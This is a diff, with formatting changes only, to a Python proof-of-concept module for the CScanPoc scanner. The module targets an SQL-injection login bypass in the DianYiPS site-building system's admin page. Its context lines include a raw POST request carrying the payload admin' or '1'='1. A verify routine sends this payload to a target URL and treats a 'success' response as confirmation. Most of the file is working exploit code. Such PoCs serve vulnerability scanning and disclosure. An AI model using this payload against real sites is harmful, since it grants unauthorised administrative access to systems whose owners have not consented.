@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DianYiPS_0001' # 平台漏洞编号，留空
+    vuln_id = 'DianYiPS_0001'  # 平台漏洞编号，留空
     name = 'DianYiPS建站系统 SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-05-27'  # 漏洞公布时间
     desc = '''
         DianYiPS建站系统 /dianyi/index.php 管理后台，SQL注入漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'DianYiPS建站系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 rawt = '''
 POST /dianyi/index.php?action=login HTTP/1.1
@@ -39,6 +41,7 @@ Cache-Control: no-cache
 name=admin'%20or%20'1'%3D'1&password=5646&submit=%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95&isAjax=1
 '''
 
+
 class Poc(ABPoc):
     poc_id = 'fe80cda7-1054-4aaf-913e-ae05ad52373e'
     author = '47bwy'  # POC编写者
@@ -51,11 +54,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             # from:http://www.wooyun.org/bugs/wooyun-2015-0110810
             url = self.target
-            code, head, res, errcode, _ = hh.http(url + '/dianyi/index.php?action=login',raw = rawt)
+            code, head, res, errcode, _ = hh.http(
+                url + '/dianyi/index.php?action=login', raw=rawt)
             if code == 200:
                 m = re.search('success', res)
                 if m:
@@ -68,6 +72,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
